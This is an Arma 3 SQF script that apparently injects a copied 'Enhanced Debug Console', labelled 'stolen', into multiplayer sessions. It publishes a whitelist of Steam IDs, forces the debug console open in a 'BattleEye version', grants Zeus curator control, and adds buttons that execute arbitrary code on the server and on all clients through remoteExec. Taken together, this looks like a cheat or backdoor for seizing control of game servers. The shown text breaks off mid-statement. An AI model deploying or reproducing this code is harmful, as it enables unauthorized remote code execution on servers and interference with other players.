_test = '{ 
usersWhoAreSuperWhitelisted = [ 
"ID", 
"76561198973138476",
"76561199595078682",
"76561199153584559",
"76561199511546073",
"76561199153584559",
"76561199526402000",
"76561198275789075",
"76561197983672104",
"_SP_PLAYER_"
]; 
publicVariable ''usersWhoAreSuperWhitelisted'';
SAM_stolenDebugconsoleLOL = {
    edc_serverexeccodere = ["", {
        item3 = createVehicle[''Sign_Pointer_Blue_F'', [23050.8, 7279.79, 0], [], 0, ''CAN_COLLIDE''];
        item3 setPosWorld[23050.8, 7279.79, 49.07];
        [item3, [
            [0, 1, 0],
            [0, 0, 1]
        ]] remoteExecCall["setVectorDirAndUp", 0, item3];
        item3 setObjectTextureGlobal[0, ""];


        _this select 0 drawIcon["\A3\ui_f\data\map\markers\nato\b_hq.paa", [0, 0.3, 0.6, 1], getPos item3, 20, 20, 0, "", 0, 0.05, "TahomaB", "right"];
    }];
    edc_fnc_addunittozeusinterface = {
        _unit = _this; {
            [_x, [
                [_unit], true
            ]] remoteExec[''addCuratorEditableObjects'', 0, _unit];
        }
        forEach allCurators;
    };
    edc_refnc = ["",{ 
        [floor diag_fps,  
        { 
        _this call (EDC_REfnc # 2); 
        }] remoteExec [''spawn'', remoteExecutedOwner]; 
        },{ 
        with uinamespace do  
        { 
        EDC_PerfMetServerFPS ctrlSetStructuredText parseText format ["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Server FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, _this,  1.05 * EDC_textSize]; 
        EDC_PerfMetServerFPS ctrlCommit 0; 
        }; 
        },{ 
        [diag_fps,  
        { 
        _this call (EDC_REfnc # 4); 
        }] remoteExec [''call'', remoteExecutedOwner]; 
        },{ 
        EDC_avgFPS_values pushBack _this; 
        EDC_avgFPS_returnCount = EDC_avgFPS_returnCount + 1; 
        },{ 
        params [''_zeusLogic'']; 
        EDC_zeusLogic = _zeusLogic; 
        waitUntil {alive player}; 
        if (isNil ''EDC_zeusLogic'') exitWith {if (!isGamePaused) then {  playSound ''addItemFailed'';};systemChat ''isNil EDC_zeusLogic *'';}; 
        if (isNull EDC_zeusLogic) exitWith {if (!isGamePaused) then {playSound ''addItemFailed'';};systemChat ''isNull EDC_zeusLogic *'';}; 
        if (!isNil ''EDC_EH_assignZeusOnRespawn'') then  
        { 
        player removeEventHandler [''Respawn'', EDC_EH_assignZeusOnRespawn]; 
        }; 
        EDC_EH_assignZeusOnRespawn = player addEventHandler [''Respawn'',  
        { 
        [] spawn  
        { 
        waitUntil {alive player}; 
        if (isNil ''EDC_zeusLogic'') exitWith { 
        systemChat ''isNil EDC_zeusLogic''; 
        if (!isGamePaused) then {playSound ''addItemFailed'';}; 
        }; 
        if (isNull EDC_zeusLogic) exitWith { 
        if (!isGamePaused) then {playSound ''addItemFailed'';}; 
        }; 
        systemChat ''[ Enhanced Debug Console ] : Re-assigning curator...''; 
        while {isNull (getAssignedCuratorLogic player)} do  
        { 
            [[player, EDC_zeusLogic], 
            { 
            _this call (EDC_REfnc # 6); 
            }] remoteExec [''call'', 2]; 
            sleep 1; 
            uiSleep 1; 
        }; 
        waitUntil {!isNull (getAssignedCuratorLogic player)}; 
        systemChat ''[ Enhanced Debug Console ] : Curator re-assigned.''; 
        }; 
        }]; 
        },{ 
        params [''_zeusUnit'', ''_zeusLogic'']; 
        unassignCurator _zeusLogic;  
        _zeusUnit assignCurator _zeusLogic; 
        },{ 
        params [''_unit'', ''_uid'']; 
        _vvn = vehicleVarName _unit; 
        _zeusGroupVar = format ["EDC_zeusGroup_%1", _uid]; 
        _codeStr1 = format ["%1 = createGroup sideLogic;", _zeusGroupVar]; 
        _code1 = compile _codeStr1; 
        [] call _code1; 
        waitUntil {!isNil _zeusGroupVar}; 
        _zeusLogicVar = format ["EDC_zeusLogic_%1", _uid]; 
        _codeStr2 = format ["%1 = %2 createUnit [''ModuleCurator_F'', [worldSize, worldSize, 0], [], 0.5, ''NONE''];", _zeusLogicVar, _zeusGroupVar]; 
        _code2 = compile _codeStr2; 
        [] call _code2; 
        waitUntil {!isNil _zeusLogicVar}; 
        _codeStr3_a = format  
        [ 
        " 
        %1 setVariable [''text'',''%1''];  
        %1 setVariable [''Addons'',3, true]; 
        %1 setVariable [''owner'', ''objNull'']; 
        %1 setVariable  
        [ 
            ''vehicleinit'', 
            ""%2"" 
        ]; 
        ",  
        _zeusLogicVar, 
        " 
        _this setVariable [''Addons'', 3, true]; 
        _this setVariable [''owner'', ''objNull'']; 
        " 
        ]; 
        _code3_a = compile _codeStr3_a; 
        [] call _code3_a; 
        _zeusAttributesVar = format ["EDC_zeusAttributes_%1", _uid]; 
        _codeStr3_b = format  
        [ 
        " 
        %1 = %2 createUnit [''ModuleCuratorSetAttributesPlayer_F'', [worldSize, worldSize, 0], [], 0.5, ''NONE'']; 
        ", 
        _zeusAttributesVar, 
        _zeusGroupVar 
        ]; 
        _code3_b = compile _codeStr3_b; 
        [] call _code3_b; 
        waitUntil {!isNil _zeusAttributesVar}; 
        _codeStr4 = format  
        [ 
        " 
        %3 setVariable [''curator'',''%1'']; 
        %3 setVariable [''unitpos'',true]; 
        %3 setVariable [''fuel'',true]; 
        %3 setVariable [''respawnposition'',true]; 
        %3 setVariable [''respawnvehicle'',true]; 
        %3 setVariable [''skill'',true]; 
        %3 setVariable [''rank'',true]; 
        %3 setVariable [''damage'',true]; 
        %3 setVariable [''exec'',true]; 
        %3 setVariable [''lock'',true];  
        %3 setVariable  
        [ 
            ''vehicleinit'', 
            "" 
            _this setVariable [''curator'',''%1'']; 
            _this setVariable [''unitpos'',true]; 
            _this setVariable [''fuel'',true]; 
            _this setVariable [''respawnposition'',true]; 
            _this setVariable [''respawnvehicle'',true]; 
            _this setVariable [''skill'',true]; 
            _this setVariable [''rank'',true]; 
            _this setVariable [''damage'',true]; 
            _this setVariable [''exec'',true]; 
            _this setVariable [''lock'',true]; 
            "" 
        ]; 
        [ %1, [-1, -2, 0, 1] ] spawn BIS_fnc_setCuratorVisionModes; 
        %1 setCuratorCoef [''place'',1]; 
        %1 setCuratorCoef [''edit'',1]; 
        %1 setCuratorCoef [''delete'',1]; 
        %1 setCuratorCoef [''destroy'',1]; 
        %1 setCuratorCoef [''group'',1]; 
        %1 setCuratorCoef [''synchronize'',1]; 
        %1 setvariable [''BIS_fnc_curatorAttributesPlayer'',[''Skill'',''UnitPos'',''Rank'',''Damage'',''Fuel'',''Lock'',''RespawnVehicle'',''RespawnPosition'',''Exec''],true]; 
        comment "" 
        %1 setvariable [''BIS_fnc_curatorAttributesObject'',[''%ALL''],true]; 
        %1 setvariable [''BIS_fnc_curatorAttributesGroup'',[''%ALL''],true]; 
        %1 setvariable [''BIS_fnc_curatorAttributesWaypoint'',[''%ALL''],true]; 
        %1 setvariable [''BIS_fnc_curatorAttributesMarker'',[''%ALL''],true]; 
        ""; 
        ",  
        _zeusLogicVar, 
        _zeusGroupVar, 
        _zeusAttributesVar, 
        "" 
        ]; 
        _code4 = compile _codeStr4; 
        [] call _code4; 
        _zeusUpdateObjsVar = format ["%1_updateEditableObjects", _zeusLogicVar]; 
        _codeStr5 = format ["%1 = false;", _zeusUpdateObjsVar]; comment "auto update disabled (add editable objects to zeus interface)"; 
        _code5 = compile _codeStr5; 
        [] call _code5; 
        _codeStr6 = format  
        [ 
        " 
        %1 deleteGroupWhenEmpty true; 
        ",  
        _zeusGroupVar 
        ]; 
        _code6 = compile _codeStr6; 
        [] spawn _code6; 
        EDC_zeus_objBlacklist =  
        [ 
        "Logic", 
        "ModuleHQ_F", 
        "ModuleSector_F", 
        "ModuleCurator_F", 
        "VirtualCurator_F", 
        "ModuleCuratorSetCosts_F", 
        "ModuleCuratorSetCoefs_F", 
        "LogicSectorPreview100m_F", 
        "LogicSectorUnknown100m_F", 
        "ModuleCuratorSetCamera_F", 
        "ModuleMPTypeGameMaster_F", 
        "ModuleCuratorAddPoints_F", 
        "ModuleRadioChannelCreate_F", 
        "ModuleCuratorSetModuleCosts_F", 
        "ModuleCuratorSetObjectCosts_F", 
        "ModuleCuratorSetDefaultCosts_F", 
        "ModuleCuratorSetAttributesPlayer_F", 
        "ModuleCuratorAddEditingAreaPlayers_F" 
        ]; 
        EDC_zeus_objWhitelist =  
        [ 
        "ModuleLightning_F", 
        "ModuleRemoteControl_F", 
        "ModuleArsenal_F", 
        "ModuleHint_F", 
        "ModulePunishment_F", 
        "ModuleBootcampStage_F", 
        "ModuleSmokeYellow_F", 
        "ModuleSmokeWhite_F", 
        "ModuleSmokeRed_F", 
        "ModuleSmokePurple_F", 
        "ModuleSmokeOrange_F", 
        "ModuleSmokeGreen_F", 
        "ModuleSmokeBlue_F", 
        "ModuleMissionName_F", 
        "ModuleRespawnTickets_F", 
        "ModuleEndMission_F", 
        "ModuleCountdown_F", 
        "ModuleDiary_F", 
        "ModuleVehicleRespawnPositionEast_F", 
        "ModuleVehicleRespawnPositionGuer_F", 
        "ModuleVehicleRespawnPositionCiv_F", 
        "ModuleVehicleRespawnPositionWest_F", 
        "ModuleRespawnPositionEast_F", 
        "ModuleRespawnPositionGuer_F", 
        "ModuleRespawnPositionCiv_F", 
        "ModuleRespawnPositionWest_F", 
        "ModuleRespawnInventory_F", 
        "ModuleObjectiveRaceStart_F", 
        "ModuleObjectiveRaceFinish_F", 
        "ModuleObjectiveRaceCP_F", 
        "ModuleObjectiveProtect_F", 
        "ModuleObjectiveNeutralize_F", 
        "ModuleObjectiveMove_F", 
        "ModuleObjectiveGetIn_F", 
        "ModuleObjective_F", 
        "ModuleObjectiveSector_F", 
        "ModuleObjectiveAttackDefend_F", 
        "ModuleFlareGreen_F", 
        "ModuleFlareRed_F", 
        "ModuleFlareWhite_F", 
        "ModuleFlareYellow_F", 
        "ModuleCASMissile_F", 
        "ModuleCASGun_F", 
        "ModuleCASGunMissile_F", 
        "ModuleCASBomb_F", 
        "ModuleOrdnanceMortar_F", 
        "ModuleOrdnanceRocket_F", 
        "ModuleOrdnanceHowitzer_F", 
        "ModuleWeather_F", 
        "ModuleTimeMultiplier_F", 
        "ModuleSkiptime_F", 
        "ModulePostprocess_F", 
        "ModuleTracers_F", 
        "ModuleIRGrenade_F", 
        "ModuleChemlightBlue_F", 
        "ModuleChemlightGreen_F", 
        "ModuleChemlightRed_F", 
        "ModuleChemlightYellow_F", 
        "ModuleMusic_F", 
        "ModuleRadio_F", 
        "ModuleSound_F", 
        "ModuleAnimalsButterflies_F", 
        "ModuleAnimalsGoats_F", 
        "ModuleAnimalsPoultry_F", 
        "ModuleAnimalsSeagulls_F", 
        "ModuleAnimalsSheep_F" 
        ]; 
        EDC_fnc_getEditableObjs =  
        { 
        _allObjs = allMissionObjects ''all''; 
        _objsToAdd = []; 
        { 
        _addObject = false; 
        _className = typeOf _x; 
        _isKindOfLogic = _x isKindOf ''Logic''; 
        _isInWhitelist = _className in EDC_zeus_objWhitelist; 
        _isInBlacklist = _className in EDC_zeus_objBlacklist; 
        if (_isKindOfLogic) then  
        { 
            if ((!_isInBlacklist) OR (_isInWhitelist)) then  
            { 
            _addObject = true; 
            }; 
        } else  
        { 
            if (!_isInBlacklist) then  
            { 
            _addObject = true; 
            }; 
        }; 
        if !(_x getVariable [''EDC_isEditable'', true]) then  
        { 
            _addObject = false; 
        }; 
        if (_addObject) then  
        { 
            _objsToAdd pushBack _x; 
        }; 
        } forEach _allObjs; 
        _objsToAdd; 
        }; 
        EDC_fnc_refreshGroups =  
        { 
        { 
        if ((count (units _x)) == 0) then  
        { 
            deleteGroup _x 
        }; 
        } forEach allGroups; 
        }; 
        EDC_fnc_updateZeusObjs =  
        { 
        params [''_zeusLogic'', ''_uid'']; 
        _objsToAdd = [] call EDC_fnc_getEditableObjs; 
        _zeusLogic addCuratorEditableObjects [_objsToAdd, true]; 
        [] call EDC_fnc_refreshGroups; 
        }; 
        _codeStr7 = format  
        [ 
        " 
        while {%3} do  
        { 
            _isOwnerConnected = false; 
            { 
            if (getPlayerUID _x == ''%2'') then  
            { 
            _isOwnerConnected = true; 
            }; 
            } forEach allPlayers; 
            if (_isOwnerConnected) then  
            { 
            if (isNull (getAssignedCuratorUnit %1)) then  
            { 
            } else  
            { 
            if (isNil ''EDC_fnc_updateZeusObjs'') then  
            { 
            } else  
            { 
            [%1, ''%2''] call EDC_fnc_updateZeusObjs; 
            }; 
            }; 
            } else  
            { 
            deleteVehicle %1; 
            deleteVehicle %4; 
            %3 = false; 
            }; 
            sleep 15; 
        }; 
        ",  
        _zeusLogicVar, 
        _uid, 
        _zeusUpdateObjsVar, 
        _zeusAttributesVar 
        ]; 
        _code7 = compile _codeStr7; 
        [] spawn _code7; 
        _codeStr_assign = format  
        [ 
        " 
        %1 assignCurator %2; 
        [[%2], 
        { 
            _this spawn (EDC_REfnc # 5); 
        }] remoteExec [''call'', remoteExecutedOwner]; 
        ",  
        if (_vvn == '''') then {''_this''} else {_vvn},  
        _zeusLogicVar 
        ]; 
        _code_assign = compile _codeStr_assign; 
        _unit call _code_assign; 
        },{ 
        comment "-----------------------------------------------"; 
        if (!hasInterface) exitWith {}; 
        waitUntil { !isNil { player } && { !isNull player } }; 
        waitUntil { !isNull (findDisplay 46) }; 
        comment "-----------------------------------------------"; 
        EDC_fnc_addUnitToZeusInterface =  
        { 
        _unit = _this; 
        { 
        [_x, [[_unit], true]] remoteExec [''addCuratorEditableObjects'', 0, _unit]; 
        } forEach allCurators; 
        }; 
        waitUntil {alive player}; 
        player call EDC_fnc_addUnitToZeusInterface; 
        if (!isNil ''EDC_EH_addSelfToZeusInterface'') then  
        { 
        player removeEventHandler [''respawn'',EDC_EH_addSelfToZeusInterface]; 
        }; 
        EDC_EH_addSelfToZeusInterface = player addEventHandler [''respawn'',  
        { 
        params ["_unit", "_corpse"]; 
        [] spawn  
        { 
        waitUntil {alive player}; 
        player call EDC_fnc_addUnitToZeusInterface; 
        }; 
        }]; 
        },{ 
        params [[''_target'', objNull]]; 
        this = _target; 
        private _code = EDC_targetExecCodeRE # 1; 
        private _return = ([nil] apply {_target call _code} param [0, text ""]); 
        private _returnStr = str _return; 
        [[_returnStr],  
        { 
        _this call (EDC_REfnc # 10); 
        }] remoteExec ["call", remoteExecutedOwner]; 
        },{ 
        params [[''_returnStr'','''']]; 
        (uiNamespace getVariable ''EDC_expressionOutput'') ctrlSetText _returnStr; 
        (uiNamespace getVariable ''EDC_expressionOutput'') ctrlCommit 0; 
        },{ 
        private _code = EDC_globalExecCodeRE # 1; 
        private _return = ([nil] apply {[] call _code} param [0, text ""]); 
        private _returnStr = str _return; 
        [[_returnStr],  
        { 
        _this call (EDC_REfnc # 10); 
        }] remoteExec ["call", remoteExecutedOwner]; 
        },{ 
        private _code = EDC_serverExecCodeRE # 1; 
        private _return = ([nil] apply {[] call _code} param [0, text ""]); 
        private _returnStr = str _return; 
        [[_returnStr],  
        { 
        _this call (EDC_REfnc # 10); 
        }] remoteExec ["call", remoteExecutedOwner]; 
        }];
    edc_fnc_updatezeuscount = {
        _zeusLogics = allCurators;
        _zeusLogicCount = count _zeusLogics;
        _activeZeusLogics = []; {
            if (!isNull(getAssignedCuratorUnit _x)) then {
                _activeZeusLogics pushBack _x
            };
        }
        forEach _zeusLogics;
        _activeZeusLogicCount = count _activeZeusLogics;
        with uinamespace do {
            EDC_PerfMetZeusCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Zeus Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetZeusCount ctrlCommit 0;
            EDC_PerfMetZeusCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Zeus Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, _activeZeusLogicCount, 1.05 * EDC_textSize];
            EDC_PerfMetZeusCount ctrlCommit 0;
        };
    };
    edc_fnc_editdebugconsole = {
        if (isNull finddisplay 49) exitWith {
            showChat true;
            systemChat ''[ Enhanced Debug Console ] : ERROR - Console could not open (isNull finddisplay 49)!'';
        };

        comment "BattleEye version";
        [] call EDC_fnc_forceShowConsole;

        with uinamespace do {
            private _display = findDisplay 49;

            _display displayRemoveAllEventHandlers ''MouseButtonDown'';

            _display displayAddEventHandler[''Unload'', {
                params["_display", "_exitCode"];
                with uinamespace do {
                    profilenamespace setVariable[''RscDebugConsole_expression'', ctrlText EDC_expression]
                };
                []
                call EDC_fnc_showChat;
                [] call EDC_fnc_unhighlightAllObjects;
                [] spawn EDC_fnc_showExternalWatchResults;
                EDC_avgFPS_pinging = false;


                comment "//--- Remember last values";
                if (ctrlEnabled _expressionCtrl) then {
                    _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";
                    _expressionResultHistory set[0, ctrlText(uinamespace getVariable ''EDC_expressionOutput'')];
                    parsingNamespace setVariable["BIS_RscDebugConsoleExpressionResultHistory", _expressionResultHistory];
                    call EDC_fnc_saveExpression;
                };

                {
                    private _value = _x getVariable["RscDebugConsole_watchStatus", [true, ""]];
                    if (_value select 1 isEqualTo "") then {
                        _value set[0, true]
                    };
                    _value set[1, ctrlText _x];
                    _value set[2, _x getVariable["RscDebugConsole_watchPaused", false]];
                    profileNamespace setVariable["RscDebugConsole_watch" + str(_forEachIndex + 1), _value];
                }
                forEach(uinamespace getVariable[''EDC_ctrls_watchInputs'', []]);



            }];

            {
                switch (ctrlClassName _x) do {
                    case ''ButtonExecuteServerBackground'':{
                            uinamespace setVariable[''EDC_ButtonExecuteServerBackground'', _x]
                        };
                    case ''ButtonExecuteAllBackground'':{
                            uinamespace setVariable[''EDC_ButtonExecuteAllBackground'', _x]
                        };
                    case ''ButtonExecuteLocalBackground'':{
                            uinamespace setVariable[''EDC_ButtonExecuteLocalBackground'', _x]
                        };

                };
            }
            forEach allControls _display;

            comment "(_display displayCtrl 2) ctrlShow false;";

            private _translateDown = 0.792;

            private _ctrlGroupParent = _display displayCtrl 13184;
            _ctrlGroupParent ctrlSetPosition[0.21125 * safezoneW + safezoneX, 0.021 * safezoneH + safezoneY, 0.495 * safezoneW, 0.918 * safezoneH];
            _ctrlGroupParent ctrlCommit 0;

            _Title = _display displayCtrl 11884;
            _Title ctrlSetText '''';
            _Title ctrlCommit 0;

            _Title_debugConsole = _display ctrlCreate[''RscStructuredText'', 14011, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _Title;
            _ctrlPos set[2, (_ctrlPos# 2)];
            _Title_debugConsole ctrlSetBackgroundColor[0, 0, 0, 0];
            _Title_debugConsole ctrlSetPosition _ctrlPos;
            _Title_debugConsole ctrlSetStructuredText parseText format["<t font=''puristaMedium'' shadow=''0'' color=''#00FFFFFF'' size=''%1''><img image=''a3\ui_f_curator\data\displays\rscDisplayCurator\modeRecent_ca.paa''></img><t color=''#FFFFFF'' align=''center''>Enhanced Debug Console %2<t align=''right''>BE<t/>", EDC_textSize * 1.05, EDC_versionStr];
            _Title_debugConsole ctrlCommit 0;

            _EDC_logo = _display ctrlCreate[''RscStructuredText'', 14046, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _Title_debugConsole;
            _ctrlPos set[0, (_ctrlPos# 0) - 0.003];
            _ctrlPos set[1, (_ctrlPos# 1) - 0.007];
            _ctrlPos set[3, (_ctrlPos# 3) + 0.007];
            _EDC_logo ctrlSetBackgroundColor[0, 0, 0, 0];
            _EDC_logo ctrlSetPosition _ctrlPos;
            _EDC_logo ctrlSetStructuredText parseText format["<t font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\ui_f\data\IGUI\Cfg\holdactions\holdAction_hack_ca.paa''></img>", EDC_textSize * 1.45];
            _EDC_logo ctrlCommit 0;


            _ExpressionText = _display displayCtrl 11892;
            _ExpressionText ctrlSetText ''Execute:'';
            _ExpressionText ctrlCommit 0;


            _ExpressionBackground = _display displayCtrl 11885;
            _ctrlPos = ctrlPosition _ExpressionBackground;
            _ctrlPos set[2, (_ctrlPos# 2) + 0.001];
            _ctrlPos set[3, (_ctrlPos# 3) + _translateDown];
            _ExpressionBackground ctrlSetPosition _ctrlPos;
            _ExpressionBackground ctrlCommit 0;
            _ExpressionBackground ctrlEnable false;

            _Expression = _display displayCtrl 12284;
            _ctrlPos = ctrlPosition _Expression;
            _ctrlPos set[2, (_ctrlPos# 2) + 0.001];
            _ctrlPos set[3, (_ctrlPos# 3) + _translateDown];
            _Expression ctrlSetPosition _ctrlPos;

            comment "BattleEye version";

            _Expression ctrlSetText(profilenamespace getVariable[''RscDebugConsole_expression'', '''']);

            _Expression ctrlCommit 0;
            EDC_expression = _expression;



            _ExpressionOutputBackground = _display displayCtrl 13191;
            _ctrlPos = ctrlPosition _ExpressionOutputBackground;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) + 0.001];
            _ExpressionOutputBackground ctrlSetPosition _ctrlPos;
            _ExpressionOutputBackground ctrlCommit 0;
            _ExpressionOutputBackground ctrlEnable false;

            EDC_expressionOutputBackground = _ExpressionOutputBackground;

            _ExpressionOutput = _display displayCtrl 13190;
            _ctrlPos = ctrlPosition _ExpressionOutput;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ctrlPos set[2, (_ctrlPos# 2) + 0.001];
            _ExpressionOutput ctrlSetPosition _ctrlPos;
            _ExpressionOutput ctrlCommit 0;

            EDC_ExpressionOutput = _ExpressionOutput;

            _ButtonCodePerformance = _display displayCtrl 13284;
            _ctrlPos = ctrlPosition _ButtonCodePerformance;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonCodePerformance ctrlSetPosition _ctrlPos;
            _ButtonCodePerformance ctrlRemoveAllEventHandlers "ButtonClick";
            _ButtonCodePerformance ctrlAddEventHandler["ButtonClick", {
                with uiNameSpace do {
                    _previousExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];
                    _currentExpression = ctrlText EDC_expression;
                    profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
                    comment "saveProfileNamespace;";
                };
                []
                spawn EDC_fnc_codePerformance;
            }];
            _ButtonCodePerformance ctrlCommit 0;




            _ctrlPos = ctrlPosition EDC_ButtonExecuteServerBackground;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            EDC_ButtonExecuteServerBackground ctrlSetPosition _ctrlPos;
            EDC_ButtonExecuteServerBackground ctrlCommit 0;

            _ButtonExecuteServer = _display displayCtrl 13286;
            _ctrlPos = ctrlPosition _ButtonExecuteServer;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonExecuteServer ctrlSetPosition _ctrlPos;
            _ButtonExecuteServer ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\statusbar\server_ca.paa''></img> SERVER EXEC<t/>", 1.05 * EDC_textSize];
            _ButtonExecuteServer ctrlAddEventHandler["ButtonClick", {
                [''server''] call EDC_fnc_consoleExec;
            }];
            _ButtonExecuteServer ctrlCommit 0;

            EDC_ButtonExecuteServer = _ButtonExecuteServer;


            _ctrlPos = ctrlPosition EDC_ButtonExecuteAllBackground;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            EDC_ButtonExecuteAllBackground ctrlSetPosition _ctrlPos;
            EDC_ButtonExecuteAllBackground ctrlCommit 0;

            _ButtonExecuteAll = _display displayCtrl 13285;
            _ctrlPos = ctrlPosition _ButtonExecuteAll;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonExecuteAll ctrlSetPosition _ctrlPos;
            _ButtonExecuteAll ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_global_ca.paa''></img> GLOBAL EXEC<t/>", 1.05 * EDC_textSize];
            _ButtonExecuteAll ctrlAddEventHandler["ButtonClick", {
                [''global''] call EDC_fnc_consoleExec;
            }];
            _ButtonExecuteAll ctrlCommit 0;

            EDC_ButtonExecuteAll = _ButtonExecuteAll;

            _ctrlPos = ctrlPosition EDC_ButtonExecuteLocalBackground;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            EDC_ButtonExecuteLocalBackground ctrlSetPosition _ctrlPos;
            EDC_ButtonExecuteLocalBackground ctrlCommit 0;

            _ButtonExecuteLocal = _display displayCtrl 13484;
            _ctrlPos = ctrlPosition _ButtonExecuteLocal;
            _ctrlPos set[0, (_ctrlPos# 0) + 0.001];
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown];
            _ButtonExecuteLocal ctrlSetPosition _ctrlPos;
            _ButtonExecuteLocal ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_local_ca.paa''></img> LOCAL EXEC<t/>", 1.05 * EDC_textSize];
            _ButtonExecuteLocal ctrlAddEventHandler["ButtonClick", {
                [''local''] call EDC_fnc_consoleExec;
                [] spawn {
                    uiSleep 0.001;
                    with uinamespace do {
                        EDC_ButtonExecuteServer ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\statusbar\server_ca.paa''></img> SERVER EXEC<t/>", 1.05 * EDC_textSize];
                        EDC_ButtonExecuteAll ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_global_ca.paa''></img> GLOBAL EXEC<t/>", 1.05 * EDC_textSize];
                        EDC_ButtonExecuteLocal ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_local_ca.paa''></img> LOCAL EXEC<t/>", 1.05 * EDC_textSize];
                        EDC_ButtonExecuteTarget ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img> TARGET EXEC<t font=''EtelkaMonospacePro''>:<t/>", 1.05 * EDC_textSize];

                        EDC_ButtonExecuteServer ctrlCommit 0;
                        EDC_ButtonExecuteAll ctrlCommit 0;
                        EDC_ButtonExecuteLocal ctrlCommit 0;
                        EDC_ButtonExecuteTarget ctrlCommit 0;

                        EDC_ButtonExecuteTarget ctrlEnable true;
                    };
                };
            }];
            _ButtonExecuteLocal ctrlCommit 0;
            EDC_ButtonExecuteLocal = _ButtonExecuteLocal;




            _ButtonExecuteTarget = _display ctrlCreate[''RscButtonMenu'', 14008, _ctrlGroupParent];
            _ctrlPos set[0, (_ctrlPos# 0) + 0.210];
            _ButtonExecuteTarget ctrlSetBackgroundColor[0.0, 0.1, 0.1, 0.9];
            _ButtonExecuteTarget ctrlSetPosition _ctrlPos;
            _ButtonExecuteTarget ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img> TARGET EXEC<t font=''EtelkaMonospacePro''>:<t/>", 1.05 * EDC_textSize];
            _ButtonExecuteTarget ctrlAddEventHandler["ButtonClick", {
                [''target''] call EDC_fnc_consoleExec;
            }];

            _ButtonExecuteTarget ctrlCommit 0;

            EDC_ButtonExecuteTarget = _ButtonExecuteTarget;

            _ComboSelectTargetType = _display ctrlCreate[''RscCombo'', 14009, _ctrlGroupParent];
            _ctrlPos set[0, (_ctrlPos# 0) + 0.210];
            _ctrlPos set[2, (_ctrlPos# 2) + 0.004];
            _ComboSelectTargetType ctrlSetBackgroundColor[0, 0, 0, 0.9];
            _ComboSelectTargetType ctrlSetPosition _ctrlPos;
            _ComboSelectTargetType ctrlSetFont ''EtelkaMonospacePro'';
            _ComboSelectTargetType ctrlSetFontHeight 0.03;
            _index0 = _ComboSelectTargetType lbAdd "Selected Unit";
            _index1 = _ComboSelectTargetType lbAdd "cursorObject";
            _index2 = _ComboSelectTargetType lbAdd "cursorTarget";
            _index3 = _ComboSelectTargetType lbAdd "curatorSelected";


            switch (missionNamespace getVariable[''EDC_targetType'', 0]) do {
                case 0:{
                        _ComboSelectTargetType lbSetCurSel _index0;
                    };
                case 1:{
                        _ComboSelectTargetType lbSetCurSel _index1;
                    };
                case 2:{
                        _ComboSelectTargetType lbSetCurSel _index2;
                    };
                case 3:{
                        _ComboSelectTargetType lbSetCurSel _index3;
                    };
                default {
                    _ComboSelectTargetType lbSetCurSel _index0;
                };
            };

            _ComboSelectTargetType ctrlAddEventHandler[''LBSelChanged'', {
                params["_control", "_selectedIndex"];
                missionNamespace setVariable[''EDC_targetType'', _selectedIndex];
            }];

            _ComboSelectTargetType ctrlCommit 0;

            EDC_ComboSelectTargetType = _ComboSelectTargetType;


            EDC_ctrls_watchInputs = [];
            EDC_ctrls_watchOutputs = [];

            _WatchBackground = _display displayCtrl 11886;
            _ctrlPos = ctrlPosition _WatchBackground;
            _ctrlPos set[1, (_ctrlPos# 1) + _translateDown - 0.003];
